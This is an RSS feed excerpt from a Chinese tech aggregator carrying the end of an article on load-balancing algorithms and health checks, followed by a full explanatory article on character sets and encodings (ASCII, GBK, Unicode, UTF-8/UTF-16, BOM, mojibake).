&lt;p&gt;最少连接数均衡（Least Connection）：客户端的每一次请求服务在服务器停留的时间可能会有较大的差异，随着工作时间加长，如果采用简单的轮循或随机均衡算法，每一台服务器上的连接进程可能会产生极大的不同，并没有达到真正的负载均衡。最少连接数均衡算法对内部中需负载的每一台服务器都有一个数据记录，记录当前该服务器正在处理的连接数量，当有新的服务连接请求时，将把当前请求分配给连接数最少的服务器，使均衡更加符合实际情况，负载更加均衡。此种均衡算法适合长时处理的请求服务，如FTP。&lt;/p&gt;
&lt;p&gt;处理能力均衡：此种均衡算法将把服务请求分配给内部中处理负荷（根据服务器CPU型号、CPU数量、内存大小及当前连接数等换算而成）最轻的服务器，由于考虑到了内部服务器的处理能力及当前网络运行状况，所以此种均衡算法相对来说更加精确，尤其适合运用到第七层（应用层）负载均衡的情况下。&lt;/p&gt;
&lt;p&gt;DNS响应均衡（Flash DNS）：在Internet上，无论是HTTP、FTP或是其它的服务请求，客户端一般都是通过域名解析来找到服务器确切的IP地址的。在此均衡算法下，分处在不同地理位置的负载均衡设备收到同一个客户端的域名解析请求，并在同一时间内把此域名解析成各自相对应服务器的IP地址（即与此负载均衡设备在同一位地理位置的服务器的IP地址）并返回给客户端，则客户端将以最先收到的域名解析IP地址来继续请求服务，而忽略其它的IP地址响应。在种均衡策略适合应用在全局负载均衡的情况下，对本地负载均衡是没有意义的。&lt;/p&gt;
&lt;p&gt;尽管有多种的负载均衡算法可以较好的把数据流量分配给服务器去负载，但如果负载均衡策略没有对网络系统状况的检测方式和能力，一旦在某台服务器或某段负载均衡设备与服务器网络间出现故障的情况下，负载均衡设备依然把一部分数据流量引向那台服务器，这势必造成大量的服务请求被丢失，达不到不间断可用性的要求。所以良好的负载均衡策略应有对网络故障、服务器系统故障、应用服务故障的检&lt;strong&gt;测方式和能力&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;Ping侦测：通过ping的方式检测服务器及网络系统状况，此种方式简单快速，但只能大致检测出网络及服务器上的操作系统是否正常，对服务器上的应用服务检测就无能为力了。&lt;/p&gt;
&lt;p&gt;TCP Open侦测：每个服务都会开放某个通过TCP连接，检测服务器上某个TCP端口（如Telnet的23口，HTTP的80口等）是否开放来判断服务是否正常。&lt;/p&gt;
&lt;p&gt;HTTP URL侦测：比如向HTTP服务器发出一个对main.html文件的访问请求，如果收到错误信息，则认为服务器出现故障。&lt;/p&gt;
&lt;p&gt;负载均衡策略的优劣除受上面所讲的两个因素影响外，在有些应用情况下，我们需要将来自同一客户端的所有请求都分配给同一台服务器去负担，例如服务器将客户端注册、购物等服务请求信息保存的本地数据库的情况下，把客户端的子请求分配给同一台服务器来处理就显的至关重要了。有两种方式可以解决此问题，一是根据IP地址把来自同一客户端的多次请求分配给同一台服务器处理，客户端IP地址与服务器的对应信息是保存在负载均衡设备上的；二是在客户端浏览器 cookie内做独一无二的标识来把多次请求分配给同一台服务器处理，适合通过代理服务器上网的客户端。&lt;/p&gt;
&lt;p&gt;还有一种路径外返回模式（Out of Path Return），当客户端连接请求发送给负载均衡设备的时候，中心负载均衡设备将请求引向某个服务器，服务器的回应请求不再返回给中心负载均衡设备，即绕过流量分配器，直接返回给客户端，因此中心负载均衡设备只负责接受并转发请求，其网络负担就减少了很多，并且给客户端提供了更快的响应时间。此种模式一般用于HTTP服务器群，在各服务器上要安装一块虚拟网络适配器，并将其IP地址设为服务器群的VIP，这样才能在服务器直接回应客户端请求时顺利的达成三次握手。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;负载均衡实施要素&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;负载均衡方案应是在网站建设初期就应考虑的问题，不过有时随着访问流量的爆炸性增长，超出决策者的意料，这也就成为不得不面对的问题。当我们在引入某种负载均衡方案乃至具体实施时，像其他的许多方案一样，首先是确定当前及将来的应用需求，然后在代价与收效之间做出权衡。&lt;/p&gt;
&lt;p&gt;针对当前及将来的应用需求，分析网络瓶颈的不同所在，我们就需要确立是采用哪一类的负载均衡技术，采用什么样的均衡策略，在可用性、兼容性、安全性等等方面要满足多大的需求，如此等等。&lt;/p&gt;
&lt;p&gt;不管负载均衡方案是采用花费较少的软件方式，还是购买代价高昂在性能功能上更强的第四层交换机、负载均衡器等硬件方式来实现，亦或其他种类不同的均衡技术，下面这几项都是我们在引入均衡方案时可能要考虑的问题：&lt;/p&gt;
&lt;p&gt;性能：性能是我们在引入均衡方案时需要重点考虑的问题，但也是一个最难把握的问题。衡量性能时可将每秒钟通过网络的数据包数目做为一个参数，另一个参数是均衡方案中服务器群所能处理的最大并发连接数目，但是，假设一个均衡系统能处理百万计的并发连接数，可是却只能以每秒2个包的速率转发，这显然是没有任何作用的。性能的优劣与负载均衡设备的处理能力、采用的均衡策略息息相关，并且有两点需要注意：一、均衡方案对服务器群整体的性能，这是响应客户端连接请求速度的关键；二、负载均衡设备自身的性能，避免有大量连接请求时自身性能不足而成为服务瓶颈。有时我们也可以考虑采用混合型负载均衡策略来提升服务器群的总体性能，如DNS负载均衡与NAT负载均衡相结合。另外，针对有大量静态文档请求的站点，也可以考虑采用高速缓存技术，相对来说更节省费用，更能提高响应性能；对有大量ssl/xml内容传输的站点，更应考虑采用ssl/xml加速技术。&lt;/p&gt;
&lt;p&gt;可扩展性：IT技术日新月异，一年以前最新的产品，现在或许已是网络中性能最低的产品；业务量的急速上升，一年前的网络，现在需要新一轮的扩展。合适的均衡解决方案应能满足这些需求，能均衡不同操作系统和硬件平台之间的负载，能均衡HTTP、邮件、新闻、代理、数据库、防火墙和 Cache等不同服务器的负载，并且能以对客户端完全透明的方式动态增加或删除某些资源。&lt;/p&gt;
&lt;p&gt;灵活性：均衡解决方案应能灵活地提供不同的应用需求，满足应用需求的不断变化。在不同的服务器群有不同的应用需求时，应有多样的均衡策略提供更广泛的选择。&lt;/p&gt;
&lt;p&gt;可靠性：在对服务质量要求较高的站点，负载均衡解决方案应能为服务器群提供完全的容错性和高可用性。但在负载均衡设备自身出现故障时，应该有良好的冗余解决方案，提高可靠性。使用冗余时，处于同一个冗余单元的多个负载均衡设备必须具有有效的方式以便互相进行监控，保护系统尽可能地避免遭受到重大故障的损失。&lt;/p&gt;
&lt;p&gt;易管理性：不管是通过软件还是硬件方式的均衡解决方案，我们都希望它有灵活、直观和安全的管理方式，这样便于安装、配置、维护和监控，提高工作效率，避免差错。在硬件负载均衡设备上，目前主要有三种管理方式可供选择：一、命令行接口（CLI：Command Line Interface），可通过超级终端连接负载均衡设备串行接口来管理，也能telnet远程登录管理，在初始化配置时，往往要用到前者；二、图形用户接口（GUI：Graphical User Interfaces），有基于普通web页的管理，也有通过Java Applet 进行安全管理，一般都需要管理端安装有某个版本的浏览器；三、SNMP（Simple Network Management Protocol，简单网络管理协议）支持，通过第三方网络管理软件对符合SNMP标准的设备进行管理。&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Wed, 23 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-23-74131-098069b71.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-23-74131-098069b71.html</guid>
        
        
      </item>
    
      <item>
        <title>关于字符编码，你所需要知道的</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;字符编码的问题看似很小，经常被技术人员忽视，但是很容易导致一些莫名其妙的问题。这里总结了一下字符编码的一些普及性的知识，希望对大家有所帮助。&lt;/p&gt;
&lt;h2&gt;还是得从ASCII码说起&lt;/h2&gt;
&lt;p&gt;说到字符编码，不得不说ASCII码的简史。计算机一开始发明的时候是用来解决数字计算的问题，后来人们发现，计算机还可以做更多的事，例如文本处理。但由于计算机只识“数”，因此人们必须告诉计算机哪个数字来代表哪个特定字符，例如65代表字母‘A’，66代表字母‘B’，以此类推。但是&lt;strong&gt;计算机之间字符-数字的对应关系必须得一致，否则就会造成同一段数字在不同计算机上显示出来的字符不一样&lt;/strong&gt;。因此美国国家标准协会ANSI制定了一个标准，规定了常用字符的集合以及每个字符对应的编号，这就是ASCII字符集（Character Set），也称ASCII码。&lt;/p&gt;
&lt;p&gt;当时的计算机普遍使用8比特字节作为最小的存储和处理单元，加之当时用到的字符也很少，26个大小写英文字母还有数字再加上其他常用符号，也不到100个，因此使用7个比特位就可以高效的存储和处理ASCII码，剩下最高位1比特被用作一些通讯系统的奇偶校验。&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;注意，字节代表系统能够处理的最小单位，不一定是8比特。只是现代计算机的事实标准就是用8比特来代表一个字节。在很多技术规格文献中，为了避免产生歧义，更倾向于使用8位组（Octet）而不是字节（Byte）这个术语来强调8个比特的二进制流。下文中为了便于理解，我会延用大家熟悉的“字节”这个概念。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/113c27ca8568e4a3ac626cf9100fb578.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;ASCII字符集由95个可打印字符（0×20-0x7E）和33个控制字符（0×00-0×19，0x7F）组成。可打印字符用于显示在输出设备上，例如荧屏或者打印纸上，控制字符用于向计算机发出一些特殊指令，例如0×07会让计算机发出哔的一声，0×00通常用于指示字符串的结束，0x0D和0x0A用于指示打印机的打印针头退到行首（回车）并移到下一行（换行）。&lt;/p&gt;
&lt;p&gt;那时候的字符编解码系统非常简单，就是简单的查表过程。例如将字符序列编码为二进制流写入存储设备，只需要在ASCII字符集中依次找到字符对应的字节，然后直接将该字节写入存储设备即可。解码二进制流的过程也是类似。&lt;/p&gt;
&lt;h2&gt;OEM字符集的衍生&lt;/h2&gt;
&lt;p&gt;当计算机开始发展起来的时候，人们逐渐发现，ASCII字符集里那可怜的128个字符已经不能再满足他们的需求了。人们就在想，一个字节能够表示的数字（编号）有256个，而ASCII字符只用到了0×00~0x7F，也就是占用了前128个，后面128个数字不用白不用，因此很多人打起了后面这128个数字的主意。可是问题在于，很多人同时有这样的想法，但是大家对于0×80-0xFF这后面的128个数字分别对应什么样的字符，却有各自的想法。这就导致了当时销往世界各地的机器上出现了大量各式各样的OEM字符集。&lt;/p&gt;
&lt;p&gt;下面这张表是IBM-PC机推出的其中一个OEM字符集，字符集的前128个字符和ASCII字符集的基本一致（为什么说基本一致呢，是因为前32个控制字符在某些情况下会被IBM-PC机当作可打印字符解释），后面128个字符空间加入了一些欧洲国家用到的重音字符，以及一些用于画线条画的字符。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/d39baa2a063d2459172053cd3871f53c.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;事实上，大部分OEM字符集是兼容ASCII字符集的，也就是说，大家对于0×00~0x7F这个范围的解释基本是相同的，而对于后半部分0×80~0xFF的解释却不一定相同。甚至有时候同样的字符在不同OEM字符集中对应的字节也是不同的。&lt;/p&gt;
&lt;p&gt;不同的OEM字符集导致人们无法跨机器交流各种文档。例如职员甲发了一封简历résumés给职员乙，结果职员乙看到的却是r&lt;img alt=&quot;ג&quot; src=&quot;/images/jobbole.com/3471887fbcc718581dd03866ca11d4b7.jpg&quot; width=&quot;5&quot; height=&quot;9&quot; border=&quot;0&quot;&gt;sum&lt;img alt=&quot;ג&quot; src=&quot;/images/jobbole.com/3471887fbcc718581dd03866ca11d4b7.jpg&quot; width=&quot;5&quot; height=&quot;9&quot; border=&quot;0&quot;&gt;s，因为é字符在职员甲机器上的OEM字符集中对应的字节是0×82，而在职员乙的机器上，由于使用的OEM字符集不同，对0×82字节解码后得到的字符却是&lt;img alt=&quot;ג&quot; src=&quot;/images/jobbole.com/3471887fbcc718581dd03866ca11d4b7.jpg&quot; width=&quot;5&quot; height=&quot;9&quot; border=&quot;0&quot;&gt;。&lt;/p&gt;
&lt;h2&gt;多字节字符集（MBCS）和中文字符集&lt;/h2&gt;
&lt;p&gt;上面我们提到的字符集都是基于单字节编码，也就是说，一个字节翻译成一个字符。这对于拉丁语系国家来说可能没有什么问题，因为他们通过扩展第8个比特，就可以得到256个字符了，足够用了。但是对于亚洲国家来说，256个字符是远远不够用的。因此这些国家的人为了用上电脑，又要保持和ASCII字符集的兼容，就发明了多字节编码方式，相应的字符集就称为多字节字符集。例如中国使用的就是双字节字符集编码（DBCS，Double Byte Character Set）。&lt;/p&gt;
&lt;p&gt;对于单字节字符集来说，代码页中只需要有一张码表即可，上面记录着256个数字代表的字符。程序只需要做简单的查表操作就可以完成编解码的过程。&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;代码页是字符集编码的具体实现，你可以把他理解为一张“字符-字节”映射表，通过查表实现“字符-字节”的翻译。下面会有更详细的描述。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;而对于多字节字符集，代码页中通常会有很多码表。那么程序怎么知道该使用哪张码表去解码二进制流呢？答案是，&lt;strong&gt;根据第一个字节来选择不同的码表进行解析&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;例如目前最常用的中文字符集GB2312，涵盖了所有简体字符以及一部分其他字符；GBK（K代表扩展的意思）则在GB2312的基础上加入了对繁体字符等其他非简体字符（GB18030字符集不是双字节字符集，我们在讲Unicode的时候会提到）。这两个字符集的字符都是使用1-2个字节来表示。Windows系统采用936代码页来实现对GBK字符集的编解码。在解析字节流的时候，如果遇到字节的最高位是0的话，那么就使用936代码页中的第1张码表进行解码，这就和单字节字符集的编解码方式一致了。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/3c5a6e635c7657a78f2660500245dbc8.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;当字节的高位是1的时候，确切的说，当第一个字节位于0x&lt;code&gt;81&lt;/code&gt;–0x&lt;code&gt;FE之间时，根据第一个字节不同找到代码页中的相应的码表，例如当第一个字节是0x81，那么对应936中的下面这张码表：&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/c1bd6358303b67c10ec465b39e8eeca3.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;（关于936代码页中完整的码表信息，参见MSDN：&lt;a href=&quot;http://msdn.microsoft.com/en-us/library/cc194913%28v=MSDN.10%29.aspx&quot;&gt;http://msdn.microsoft.com/en-us/library/cc194913%28v=MSDN.10%29.aspx&lt;/a&gt;.）&lt;/p&gt;
&lt;p&gt;按照936代码页的码表，当程序遇到连续字节流0×81 0×40的时候，就会解码为“丂”字符。&lt;/p&gt;
&lt;h2&gt;ANSI标准、国家标准、ISO标准&lt;/h2&gt;
&lt;p&gt;不同ASCII衍生字符集的出现，让文档交流变得非常困难，因此各种组织都陆续进行了标准化流程。例如美国ANSI组织制定了ANSI标准字符编码（注意，&lt;strong&gt;我们现在通常说到ANSI编码，通常指的是平台的默认编码，例如英文操作系统中是ISO-8859-1，中文系统是GBK&lt;/strong&gt;），ISO组织制定的各种ISO标准字符编码，还有各国也会制定一些国家标准字符集，例如中国的GBK，GB2312和GB18030。&lt;/p&gt;
&lt;p&gt;操作系统在发布的时候，通常会往机器里预装这些标准的字符集还有平台专用的字符集，这样只要你的文档是使用标准字符集编写的，通用性就比较高了。例如你用GB2312字符集编写的文档，在中国大陆内的任何机器上都能正确显示。同时，我们也可以在一台机器上阅读多个国家不同语言的文档了，前提是本机必须安装该文档使用的字符集。&lt;/p&gt;
&lt;h2&gt;Unicode的出现&lt;/h2&gt;
&lt;p&gt;虽然通过使用不同字符集，我们可以在一台机器上查阅不同语言的文档，但是我们仍然无法解决一个问题：&lt;strong&gt;在一份文档中显示所有字符&lt;/strong&gt;。为了解决这个问题，我们需要一个全人类达成共识的巨大的字符集，这就是Unicode字符集。&lt;/p&gt;
&lt;h3&gt;Unicode字符集概述&lt;/h3&gt;
&lt;p&gt;Unicode字符集涵盖了目前人类使用的所有字符，并为每个字符进行统一编号，分配唯一的字符码（Code Point）。Unicode字符集将所有字符按照使用上的频繁度划分为17个层面（Plane），每个层面上有2&lt;sup&gt;16&lt;/sup&gt;=65536个字符码空间。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/63afa920ddf7fb8202d32e33c241a304.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;其中第0个层面BMP，基本涵盖了当今世界用到的所有字符。其他的层面要么是用来表示一些远古时期的文字，要么是留作扩展。我们平常用到的Unicode字符，一般都是位于BMP层面上的。目前Unicode字符集中尚有大量字符空间未使用。&lt;/p&gt;
&lt;h3&gt;编码系统的变化&lt;/h3&gt;
&lt;p&gt;在Unicode出现之前，所有的字符集都是和具体编码方案绑定在一起的，都是直接将字符和最终字节流绑定死了，例如ASCII编码系统规定使用7比特来编码ASCII字符集；GB2312以及GBK字符集，限定了使用最多2个字节来编码所有字符，并且规定了字节序。这样的编码系统通常用简单的查表，也就是通过代码页就可以直接将字符映射为存储设备上的字节流了。例如下面这个例子：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/b8d527f9a38ca589c9d1f0865a6ad409.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;这种方式的缺点在于，字符和字节流之间耦合得太紧密了，从而限定了字符集的扩展能力。假设以后火星人入住地球了，要往现有字符集中加入火星文就变得很难甚至不可能了，而且很容易破坏现有的编码规则。&lt;/p&gt;
&lt;p&gt;因此Unicode在设计上考虑到了这一点，将字符集和字符编码方案分离开。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/b742e06f36eaf51794743b85e7701651.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;也就是说，&lt;strong&gt;虽然每个字符在Unicode字符集中都能找到唯一确定的编号（字符码，又称Unicode码），但是决定最终字节流的却是具体的字符编码&lt;/strong&gt;。例如同样是对Unicode字符“A”进行编码，UTF-8字符编码得到的字节流是0×41，而UTF-16（大端模式）得到的是0×00 0×41。&lt;/p&gt;
&lt;h3&gt;常见的Unicode编码&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;UCS-2/UTF-16&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果要我们来实现Unicode字符集中BMP字符的编码方案，我们会怎么实现？由于BMP层面上有2&lt;sup&gt;16&lt;/sup&gt;=65536个字符码，因此我们只需要两个字节就可以完全表示这所有的字符了。&lt;/p&gt;
&lt;p&gt;举个例子，“中”的Unicode字符码是0x4E2D(01001110 00101101)，那么我们可以编码为01001110 00101101（大端）或者00101101 01001110 （小端）。&lt;/p&gt;
&lt;p&gt;UCS-2和UTF-16对于BMP层面的字符均是使用2个字节来表示，并且编码得到的结果完全一致。不同之处在于，&lt;strong&gt;UCS-2最初设计的时候只考虑到BMP字符，因此使用固定2个字节长度，也就是说，他无法表示Unicode其他层面上的字符，而UTF-16为了解除这个限制，支持Unicode全字符集的编解码，采用了变长编码，最少使用2个字节，如果要编码BMP以外的字符，则需要4个字节结对&lt;/strong&gt;，这里就不讨论那么远，有兴趣可以参考维基百科：&lt;a title=&quot;UTF-16/UCS-2&quot; href=&quot;http://en.wikipedia.org/wiki/UTF-16/UCS-2&quot; target=&quot;_blank&quot;&gt;UTF-16/UCS-2&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;Windows从NT时代开始就采用了UTF-16编码，很多流行的编程平台，例如.Net，Java，Qt还有Mac下的Cocoa等都是使用UTF-16作为基础的字符编码。例如代码中的字符串，在内存中相应的字节流就是用UTF-16编码过的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UTF-8&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;UTF-8应该是目前应用最广泛的一种Unicode编码方案。由于UCS-2/UTF-16对于ASCII字符使用两个字节进行编码，存储和处理效率相对低下，并且由于ASCII字符经过UTF-16编码后得到的两个字节，高字节始终是0×00，很多C语言的函数都将此字节视为字符串末尾从而导致无法正确解析文本。因此一开始推出的时候遭到很多西方国家的抵触，大大影响了Unicode的推行。后来聪明的人们发明了UTF-8编码，解决了这个问题。&lt;/p&gt;
&lt;p&gt;UTF-8编码方案采用1-4个字节来编码字符，方法其实也非常简单。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/a3efe42c610a2564c98044a8bfc8ff09.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;（上图中的x代表Unicode码的低8位，y代表高8位）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对于ASCII字符的编码使用单字节，和ASCII编码一摸一样，这样所有原先使用ASCII编解码的文档就可以直接转到UTF-8编码了。对于其他字符，则使用2-4个字节来表示，其中，首字节前置1的数目代表正确解析所需要的字节数，剩余字节的高2位始终是10。例如首字节是1110yyyy，前置有3个1，说明正确解析总共需要3个字节，需要和后面2个以10开头的字节结合才能正确解析得到字符&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;关于UTF-8的更多信息，参考维基百科：&lt;a title=&quot;UTF-8&quot; href=&quot;http://en.wikipedia.org/wiki/UTF-8&quot; target=&quot;_blank&quot;&gt;UTF-8&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GB18030&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;任何能够将Unicode字符映射为字节流的编码都属于Unicode编码。中国的GB18030编码，覆盖了Unicode所有的字符，因此也算是一种Unicode编码。只不过他的编码方式并不像UTF-8或者UTF-16一样，将Unicode字符的编号通过一定的规则进行转换，而只能通过查表的手段进行编码。&lt;/p&gt;
&lt;p&gt;关于GB18030的更多信息，参考：&lt;a title=&quot;GB18030&quot; href=&quot;http://en.wikipedia.org/wiki/GB18030&quot; target=&quot;_blank&quot;&gt;GB18030&lt;/a&gt;。&lt;/p&gt;
&lt;h3&gt;Unicode相关的常见问题&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Unicode是两个字节吗？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Unicode只是定义了一个庞大的、全球通用的字符集，并为每个字符规定了唯一确定的编号，具体存储为什么样的字节流，取决于字符编码方案。推荐的Unicode编码是UTF-16和UTF-8。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;带签名的UTF-8指的是什么意思？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;带签名指的是字节流以BOM标记开始。很多软件会“智能”的探测当前字节流使用的字符编码，这种探测过程出于效率考虑，通常会提取字节流前面若干个字节，看看是否符合某些常见字符编码的编码规则。由于UTF-8和ASCII编码对于纯英文的编码是一样的，无法区分开来，因此通过在字节流最前面添加BOM标记可以告诉软件，当前使用的是Unicode编码，判别成功率就十分准确了。但是需要注意，不是所有软件或者程序都能正确处理BOM标记，例如PHP就不会检测BOM标记，直接把它当普通字节流解析了。因此如果你的PHP文件是采用带BOM标记的UTF-8进行编码的，那么有可能会出现问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unicode编码和以前的字符集编码有什么区别？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;早期字符编码、字符集和代码页等概念都是表达同一个意思。例如GB2312字符集、GB2312编码，936代码页，实际上说的是同个东西。但是对于Unicode则不同，Unicode字符集只是定义了字符的集合和唯一编号，Unicode编码，则是对UTF-8、UCS-2/UTF-16等具体编码方案的统称而已，并不是具体的编码方案。所以当需要用到字符编码的时候，你可以写gb2312，codepage936，utf-8，utf-16，但请不要写unicode（看过别人在网页的meta标签里头写charset=unicode，有感而发）。&lt;/p&gt;
&lt;h2&gt;乱码问题&lt;/h2&gt;
&lt;p&gt;乱码指的是程序显示出来的字符文本无法用任何语言去解读。一般情况下会包含大量?或者�。乱码问题是所有计算机用户或多或少会遇到的问题。&lt;strong&gt;造成乱码的原因就是因为使用了错误的字符编码去解码字节流&lt;/strong&gt;，&lt;strong&gt;因此当我们在思考任何跟文本显示有关的问题时，请时刻保持清醒：当前使用的字符编码是什么&lt;/strong&gt;。只有这样，我们才能正确分析和处理乱码问题。&lt;/p&gt;
&lt;p&gt;例如最常见的网页乱码问题。如果你是网站技术人员，遇到这样的问题，需要检查以下原因：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器返回的响应头Content-Type没有指明字符编码&lt;/li&gt;
&lt;li&gt;网页内是否使用META HTTP-EQUIV标签指定了字符编码&lt;/li&gt;
&lt;li&gt;网页文件本身存储时使用的字符编码和网页声明的字符编码是否一致&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/2209b7e687b98f96f1ad15b8bb53cff6.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/911fab48d5f8e58eed3c18827af628ce.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;注意，网页解析的过程如果使用的字符编码不正确，还可能会导致脚本或者样式表出错。具体细节可以参考我以前写过的文章：&lt;a href=&quot;http://www.imkevinyang.com/2009/08/%E6%96%87%E6%A1%A3%E5%AD%97%E7%AC%A6%E9%9B%86%E5%AF%BC%E8%87%B4%E7%9A%84%E8%84%9A%E6%9C%AC%E9%94%99%E8%AF%AF.html&quot;&gt;文档字符集导致的脚本错误&lt;/a&gt;和&lt;a href=&quot;http://www.imkevinyang.com/2009/11/asp-net%E9%A1%B5%E9%9D%A2%E7%9A%84%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98.html&quot;&gt;Asp.Net页面的编码问题&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;不久前看到某技术论坛有人反馈，WinForm程序使用Clipboard类的GetData方法去访问剪切板中的HTML内容时会出现乱码的问题，我估计也是由于WinForm在获取HTML文本的时候没有用对正确的字符编码导致的。Windows剪贴板只支持UTF-8编码，也就是说你传入的文本都会被UTF-8编解码。这样一来，只要两个程序都是调用Windows剪切板API编程的话，那么复制粘贴的过程中不会出现乱码。除非一方在获取到剪贴板数据之后使用了错误的字符编码进行解码，才会得到乱码（我做了简单的WinForm剪切板编程实验，发现GetData使用的是系统默认编码，而不是UTF-8编码）。&lt;/p&gt;
&lt;p&gt;关于乱码中出现?或者�，这里需要额外提一下，&lt;strong&gt;当程序使用特定字符编码解析字节流的时候，一旦遇到无法解析的字节流时，就会用?或者�来替代。因此，一旦你最终解析得到的文本包含这样的字符，而你又无法得到原始字节流的时候，说明正确的信息已经彻底丢失了，尝试任何字符编码都无法从这样的字符文本中还原出正确的信息来&lt;/strong&gt;。&lt;/p&gt;
&lt;h2&gt;必要的术语解释&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;字符集（Character Set）&lt;/strong&gt;，字面上的理解就是字符的集合，例如ASCII字符集，定义了128个字符；GB2312定义了7445个字符。而&lt;strong&gt;计算机系统中提到的字符集准确来说，指的是已编号的字符的有序集合（不一定是连续）&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;字符码（Code Point）&lt;/strong&gt;指的就是字符集中每个字符的数字编号。例如ASCII字符集用0-127这连续的128个数字分别表示128个字符；GBK字符集使用区位码的方式为每个字符编号，首先定义一个94X94的矩阵，行称为“区”，列称为“位”，然后将所有国标汉字放入矩阵当中，这样每个汉字就可以用唯一的“区位”码来标识了。例如“中”字被放到54区第48位，因此字符码就是5448。而Unicode中将字符集按照一定的类别划分到0~16这17个层面（Planes）中，每个层面中拥有2&lt;sup&gt;16&lt;/sup&gt;=65536个字符码，因此Unicode总共拥有的字符码，也即是Unicode的字符空间总共有17*65536=1114112。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/46c43be8707d3543d63f0331008c36a6.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;编码&lt;/strong&gt;的过程是将字符转换成字节流。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解码&lt;/strong&gt;的过程是将字节流解析为字符。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;字符编码（Character Encoding）&lt;/strong&gt;是将字符集中的字符码映射为字节流的一种具体实现方案。例如ASCII字符编码规定使用单字节中低位的7个比特去编码所有的字符。例如‘A’的编号是65，用单字节表示就是0×41，因此写入存储设备的时候就是b’01000001’。GBK编码则是将区位码（GBK的字符码）中的区码和位码的分别加上0xA0（160）的偏移（之所以要加上这样的偏移，主要是为了和ASCII码兼容），例如刚刚提到的“中”字，区位码是5448，十六进制是0×3630，区码和位码分别加上0xA0的偏移之后就得到0xD6D0，这就是“中”字的GBK编码结果。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;代码页（Code Page）&lt;/strong&gt;一种字符编码具体形式。早期字符相对少，因此通常会使用类似表格的形式将字符直接映射为字节流，然后通过查表的方式来实现字符的编解码。现代操作系统沿用了这种方式。例如Windows使用936代码页、Mac系统使用EUC-CN代码页实现GBK字符集的编码，名字虽然不一样，但对于同一汉字的编码肯定是一样的。&lt;/p&gt;
